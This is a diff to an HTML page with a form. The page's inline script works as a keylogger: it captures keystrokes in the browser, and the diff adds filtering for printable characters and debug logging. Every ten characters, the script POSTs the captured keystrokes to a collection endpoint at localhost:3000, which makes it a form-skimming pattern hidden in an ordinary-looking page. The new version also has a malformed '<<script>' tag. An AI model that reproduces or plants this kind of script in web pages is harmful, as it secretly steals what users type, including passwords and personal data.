@@ -56,31 +56,38 @@
         </form>
     </div>
 
-    <script>
-        let log = "";
+    <<script>
+    let log = "";
 
-        window.addEventListener("keydown", function(event) {
+    window.addEventListener("keydown", function(event) {
+        console.log("Pressed key:", event.key);  // Debug line
+
+        if (event.key.length === 1) { // Only log printable characters
             log += event.key;
-
-            if (log.length >= 10) {
-                sendData(log);
-                log = "";
-            }
-        });
-
-        function sendData(data) {
-            fetch("http://localhost:3000/collect", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({ keystrokes: data })
-            }).then(res => {
-                console.log("Sent:", data);
-            }).catch(err => {
-                console.error("Error sending data", err);
-            });
         }
-    </script>
-</body>
+
+        if (log.length >= 10) {
+            sendData(log);
+            log = "";
+        }
+    });
+
+    function sendData(data) {
+        console.log("Sending:", data); // Debug line
+        fetch("http://localhost:3000/collect", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ keystrokes: data })
+        }).then(res => {
+            console.log("Sent:", data);
+        }).catch(err => {
+            console.error("Error sending data", err);
+        });
+    }
+</script>
+
+
+    </body>
 </html>
